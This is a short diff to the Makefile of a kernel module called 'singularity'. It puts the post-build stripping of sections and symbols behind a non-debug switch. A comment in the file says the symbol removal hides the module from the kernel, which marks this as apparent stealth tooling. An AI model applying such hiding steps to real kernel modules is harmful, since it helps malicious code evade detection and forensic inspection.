@@ -36,6 +36,8 @@ singularity-objs := main.o \
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+ifndef DEBUG
 	# removing artifacts from the module
 	objcopy --remove-section=__mcount_loc \
 		--remove-section=.comment \
@@ -46,6 +48,7 @@ all:
 	# if we remoce symbols from .strtab they'll be hidden from the kernel and
 	# not be shown
 	python3 ./scripts/remove_symtab.py ./singularity.ko
+endif
 
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
